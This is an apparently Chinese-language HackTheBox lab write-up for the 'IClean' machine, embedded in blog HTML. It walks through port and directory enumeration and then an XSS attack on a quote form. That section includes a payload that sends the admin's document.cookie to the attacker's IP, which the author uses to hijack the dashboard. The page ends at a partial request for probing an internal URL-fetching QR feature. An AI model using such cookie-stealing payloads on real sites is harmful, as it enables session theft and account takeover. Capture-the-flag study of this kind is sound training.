@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P IClean這是一臺套路很基本的機器，沒有什麽特色。 ‍ 0x1 Nmap123456789101112$ sudo nmap -sS -sC -sV -oA save">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - IClean">
+<meta property="og:url" content="https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P IClean這是一臺套路很基本的機器，沒有什麽特色。 ‍ 0x1 Nmap123456789101112$ sudo nmap -sS -sC -sV -oA save">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407161240-8d0bv4b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407162125-yiu6lzy.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407162110-zicfth3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407040118-6bvqp8g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041130-20nk6t5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407035508-b0l9veb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041957-a37u3kg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041653-qwf2z0b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041840-7hz7mv7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407163305-ktv4euo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407163434-2lepdme.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407164131-lqk59df.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407164252-zxxr6e1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407165712-tna90b6.png">
+<meta property="article:published_time" content="2024-04-07T09:13:10.000Z">
+<meta property="article:modified_time" content="2024-08-04T14:12:39.113Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407161240-8d0bv4b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - IClean</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/14/2024-htb-machine/14-Usage/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/05/2024-htb-machine/13-Mist/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&text=HackTheBox - Machine - IClean"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&is_video=false&description=HackTheBox - Machine - IClean"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - IClean&body=Check out this article: https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&title=HackTheBox - Machine - IClean"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&name=HackTheBox - Machine - IClean&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/07/2024-htb-machine/13-IClean/&t=HackTheBox - Machine - IClean"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.9rem;
+	   color: #00b4dd ;
+	}
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 .level-5 .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - IClean
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-07T09:13:10.000Z" class="dt-published" itemprop="datePublished">2024-04-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="IClean"><a href="#IClean" class="headerlink" title="IClean"></a>IClean</h1><p>這是一臺套路很基本的機器，沒有什麽特色。</p>
+<p>‍</p>
+<h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sS -sC -sV -oA save -p- -vv -T5 --min-rate=1000 10.129.213.71</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=</span><br><span class="line">|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Supported Methods: GET POST OPTIONS HEAD</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.52 (Ubuntu)</span></span><br></pre></td></tr></table></figure>
+
+<p>UDP什麽也沒有。</p>
+<h2 id="0x2-80-WEB-XSS-to-dashboard"><a href="#0x2-80-WEB-XSS-to-dashboard" class="headerlink" title="0x2 80 - WEB XSS to dashboard"></a>0x2 80 - WEB XSS to dashboard</h2><p>只有兩個端口，從80進去看看，會跳轉到 <code>capiclean.htb</code>​，所以加入 hosts 文件裏面。</p>
+<p>通過whatweb可以知道對面的服務器是python：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb http://capiclean.htb/                    </span><br><span class="line">http://capiclean.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], IP[10.129.213.71], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], Werkzeug[2.3.7], X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure>
+
+<p>這樣就不需要那麽高級的字典，隨手掃一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://capiclean.htb/&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line">404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">302      GET        5l       22w      189c http://capiclean.htb/logout =&gt; http://capiclean.htb/</span><br><span class="line">200      GET       88l      159w     2106c http://capiclean.htb/login</span><br><span class="line">200      GET        3l       50w     1779c http://capiclean.htb/static/images/map-icon.png</span><br><span class="line">200      GET      213l     1380w    11324c http://capiclean.htb/static/js/jquery-3.0.0.min.js</span><br><span class="line">200      GET        3l       39w     1008c http://capiclean.htb/static/images/toggle-icon.png</span><br><span class="line">200      GET        5l       46w     1384c http://capiclean.htb/static/images/search-icon.png</span><br><span class="line">200      GET      154l      399w     6084c http://capiclean.htb/choose</span><br><span class="line">200      GET        3l       56w     2181c http://capiclean.htb/static/images/icon-1.png</span><br><span class="line">200      GET        4l       53w     1995c http://capiclean.htb/static/images/fb-icon.png</span><br><span class="line">200      GET      369l     1201w     9644c http://capiclean.htb/static/js/custom.js</span><br><span class="line">200      GET      193l      579w     8592c http://capiclean.htb/services</span><br><span class="line">200      GET        8l       63w     2400c http://capiclean.htb/static/images/call-icon.png</span><br><span class="line">200      GET        6l       44w     1013c http://capiclean.htb/static/css/owl.theme.default.min.css</span><br><span class="line">200      GET        6l       73w     3248c http://capiclean.htb/static/css/owl.carousel.min.css</span><br><span class="line">200      GET       90l      181w     2237c http://capiclean.htb/quote</span><br><span class="line">200      GET      130l      355w     5267c http://capiclean.htb/about</span><br><span class="line">200      GET        4l       53w     2119c http://capiclean.htb/static/images/twitter-icon.png</span><br><span class="line">200      GET        5l       57w     2262c http://capiclean.htb/static/images/instagram-icon.png</span><br><span class="line">200      GET       15l      110w     7039c http://capiclean.htb/static/images/logo.png</span><br><span class="line">200      GET        8l       53w     2064c http://capiclean.htb/static/images/icon-2.png</span><br><span class="line">200      GET        3l       17w     1061c http://capiclean.htb/static/images/favicon.png</span><br><span class="line">200      GET      183l      564w     8109c http://capiclean.htb/team</span><br><span class="line">200      GET        5l       52w     2215c http://capiclean.htb/static/images/linkden-icon.png</span><br><span class="line">200      GET      446l     1347w    11748c http://capiclean.htb/static/css/responsive.css</span><br><span class="line">200      GET      872l     1593w    16549c http://capiclean.htb/static/css/style.css</span><br><span class="line">200      GET        1l      153w    22994c http://capiclean.htb/static/js/jquery.fancybox.min.js</span><br><span class="line">200      GET        6l      352w    19190c http://capiclean.htb/static/js/popper.min.js</span><br><span class="line">200      GET      162l      931w    80352c http://capiclean.htb/static/images/img-4.png</span><br><span class="line">200      GET        7l      896w    70808c http://capiclean.htb/static/js/bootstrap.bundle.min.js</span><br><span class="line">200      GET        1l      870w    42839c http://capiclean.htb/static/css/jquery.mCustomScrollbar.min.css</span><br><span class="line">200      GET      180l     1125w    84070c http://capiclean.htb/static/images/img-6.png</span><br><span class="line">200      GET      229l     1282w    93801c http://capiclean.htb/static/images/img-5.png</span><br><span class="line">200      GET        5l      478w    45479c http://capiclean.htb/static/js/jquery.mCustomScrollbar.concat.min.js</span><br><span class="line">200      GET      167l      997w    83329c http://capiclean.htb/static/images/img-7.png</span><br><span class="line">200      GET      332l     1920w   144448c http://capiclean.htb/static/images/img-2.png</span><br><span class="line">200      GET        5l     1287w    87088c http://capiclean.htb/static/js/jquery.min.js</span><br><span class="line">200      GET      605l     3945w   299706c http://capiclean.htb/static/images/img-3.png</span><br><span class="line">200      GET     3448l    10094w    89992c http://capiclean.htb/static/js/owl.carousel.js</span><br><span class="line">200      GET        7l     1604w   140421c http://capiclean.htb/static/css/bootstrap.min.css</span><br><span class="line">200      GET      623l     3867w   281026c http://capiclean.htb/static/images/img-1.png</span><br><span class="line">200      GET    18950l    75725w   918708c http://capiclean.htb/static/js/plugin.js</span><br><span class="line">200      GET      349l     1208w    16697c http://capiclean.htb/</span><br><span class="line">302      GET        5l       22w      189c http://capiclean.htb/dashboard =&gt; http://capiclean.htb/</span><br><span class="line">405      GET        5l       20w      153c http://capiclean.htb/sendMessage</span><br><span class="line">403      GET        9l       28w      278c http://capiclean.htb/server-status</span><br><span class="line">[<span class="comment">####################] - 2m     26633/26633   0s      found:45      errors:12</span></span><br><span class="line">[<span class="comment">####################] - 2m     26584/26584   292/s   http://capiclean.htb/                                                                                                               </span></span><br></pre></td></tr></table></figure>
+
+<p>有一個 <code>/sendMessage</code>​ 值得我注意：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不支持GET請求</span></span><br><span class="line">$ curl -X GET <span class="string">&quot;http://capiclean.htb/sendMessage&quot;</span>                                                                                                                                      </span><br><span class="line">&lt;!doctype html&gt;             </span><br><span class="line">&lt;html lang=en&gt;                                                                            </span><br><span class="line">&lt;title&gt;405 Method Not Allowed&lt;/title&gt;                                                                                                                                                   </span><br><span class="line">&lt;h1&gt;Method Not Allowed&lt;/h1&gt;                                                               </span><br><span class="line">&lt;p&gt;The method is not allowed <span class="keyword">for</span> the requested URL.&lt;/p&gt;   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 所以用POST請求試試看</span></span><br><span class="line">$ curl -X POST <span class="string">&quot;http://capiclean.htb/sendMessage&quot;</span>                                                                                                                                     </span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">&lt;h1 class=<span class="string">&quot;services_taital&quot;</span>&gt;&lt;span&gt;Thank you &lt;/span&gt; &lt;img src=<span class="string">&quot;/static/images/icon-1.png&quot;</span>&gt; &lt;span style=<span class="string">&quot;color: #1f1f1f&quot;</span>&gt;&lt;/span&gt;&lt;/h1&gt;                                         </span><br><span class="line">            &lt;p class=<span class="string">&quot;ipsum_text&quot;</span>&gt;Your quote request was sent to our management team. They will reach out soon via email. Thank you <span class="keyword">for</span> the interest you have shown <span class="keyword">in</span> our services.&lt;/p&gt; </span><br><span class="line">....                                       </span><br></pre></td></tr></table></figure>
+
+<p>上面的這句話的意思是：<code>您的报价请求已发送给我们的管理团队。他们将很快通过电子邮件与您联系。感谢您对我们的服务感兴趣。</code>​</p>
+<p>就説明管理員會查看，也就是説會有XSS，現在的問題是前端如何利用這個API，發送的數據有什麽，所以需要去網站觀察一下：</p>
+<p>來到網站：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407161240-8d0bv4b.png" alt="image">​</p>
+<p>有五個功能，選了 <code>Choose</code>​，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407162125-yiu6lzy.png" alt="image">​</p>
+<p>有個地方可以提交問卷：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407162110-zicfth3.png" alt="image">​</p>
+<p>使用smtp 服務器抓了一下，失敗，然後就只能嘗試xss了。</p>
+<p>所以嘗試使用burp 截取一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407040118-6bvqp8g.png" alt="image">​</p>
+<p>你會看到他成功的返回了</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041130-20nk6t5.png" alt="image">​</p>
+<p>一開始使用 <code>&lt;script src=&quot;http://xxx/script&quot;&gt;&lt;/script&gt;</code>​ 他成功的返回了，但是不加載 <code>mane.js</code>​ 裏面的内容：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407035508-b0l9veb.png" alt="image">​</p>
+<p>所以我就讓他强制使用 img 的方法來跳轉，這樣就可以得到cookie，可以參考hacktricks的寫法：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#retrieve-cookies">Retrieve Cookies</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041957-a37u3kg.png" alt="image">​</p>
+<p>payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=&lt;img+src%3dx+onerror%3dthis.src%3d<span class="string">&quot;http%3a//10.10.16.15/&quot;</span>%2bbtoa(document.cookie)&gt;&amp;service=&lt;script+src%3d<span class="string">&quot;http%3a//10.10.16.15/script.js&quot;</span>&gt;&lt;/script&gt;&amp;email=a</span><br></pre></td></tr></table></figure>
+
+<p>得到一個cookie：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041653-qwf2z0b.png" alt="image">​</p>
+<p>base64解碼后，使用這個cookie去登錄 <code>/dashboard</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407041840-7hz7mv7.png" alt="image">​</p>
+<h2 id="0x3-80-Dashboard"><a href="#0x3-80-Dashboard" class="headerlink" title="0x3 80 - Dashboard"></a>0x3 80 - Dashboard</h2><p>上面這四個地方，<code>Edit Services</code>​ 不知道有什麽用，下面那兩個估計是給機器人用的。</p>
+<p>點擊 <code>Generate Invoice</code>​ 隨便填寫得到一個 ID 然後去 <code>Generate QR</code>​ 裏面使用：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407163305-ktv4euo.png" alt="image">​</p>
+<p>用burp截取一下先，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-OQkDqvIqsjtDodk0-IClean/image-20240407163434-2lepdme.png" alt="image">​</p>
+<p>看到了一個很神奇的事情，儅給的是url，然後python會向服務器獲取這個文件然後base64加密后填進來，這樣就可以請求一下内部的東西：</p>
+<h2 id="0xFF-嘗試枚舉裏面的東西，不過什麽也沒有"><a href="#0xFF-嘗試枚舉裏面的東西，不過什麽也沒有" class="headerlink" title="0xFF 嘗試枚舉裏面的東西，不過什麽也沒有"></a>0xFF 嘗試枚舉裏面的東西，不過什麽也沒有</h2><p>保存請求到文件之後使用ffuf來枚舉：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> ffuf_qr_port</span><br><span class="line">POST /QRGenerator HTTP/1.1</span><br><span class="line">Host: capiclean.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 81</span><br><span class="line">Origin: http://capiclean.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://capiclean.htb/QRGenerator</span><br><span class="line">Cookie: 